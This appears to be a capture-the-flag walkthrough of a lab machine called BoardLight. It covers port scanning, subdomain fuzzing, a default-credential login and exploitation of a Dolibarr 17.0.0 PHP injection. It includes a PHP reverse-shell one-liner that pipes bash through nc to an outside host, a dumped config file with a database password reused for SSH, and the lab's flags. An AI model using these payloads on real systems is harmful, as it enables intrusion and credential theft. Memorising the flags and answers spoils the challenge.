sudo nmap -sC -sV -T4 10.10.11.11

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

sudo nano /etc/hosts
10.10.11.11 boardlight.htb

# Since it only have 2 port open, lets see how we can exploit the port 80 
# Lets try out the directory and subdomain buster

gobuster dns -d boardlight.htb -w /home/kali/Tools/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dir -u http://boardlight.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 4 
# Gobuster cant find the directory

# We still can try with ffuf and wfuzz
ffuf -w /usr/share/wordlists/wfuzz/general/medium.txt -u http://FUZZ.boardlight.htb 

wfuzz -H "Host: FUZZ.board.htb" --hc 404,403 -H "User-Agent: PENTEST" -c -z file,"/home/kali/Tools/SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt" -u http://board.htb --hl 517
...
000000072:   200        149 L    504 W      6360 Ch     "crm" 
...

# Supprisingly we can use admin:admin creedentials to login

# Found out the admin console is using dolibarr 17.0.0 and there is a vulnerability we can use
https://www.swascan.com/security-advisory-dolibarr-17-0-0/

<?PHP echo system("whoami")."<br><br>".system("pwd")."<br><br>".system("ip a");?>
...
www-data /var/www/html/crm.board.htb/htdocs/website 1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:b9:66:93 brd ff:ff:ff:ff:ff:ff altname enp3s0 altname ens160 inet 10.10.11.11/23 brd 10.10.11.255 scope global eth0 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:feb9:6693/64 scope global dynamic mngtmpaddr valid_lft 86400sec preferred_lft 14400sec inet6 fe80::250:56ff:feb9:6693/64 scope link valid_lft forever preferred_lft forever www-data
/var/www/html/crm.board.htb/htdocs/website
...

# Lets prepare a PHP nc script
<?PHP system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1| nc 10.10.14.13 8443 >/tmp/f");?>

www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
...
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';
...

# Obtain 
ssh larissa@10.10.11.11
serverfun2$2023!!

larissa@boardlight:~$ cat user.txt
efe5a867f54c3b7734b4d46c2804a986

# Upload linpeas and run
bash ./linpeas.sh


# cat root.txt
40f25ade8ae212b10b324a5da61042fb
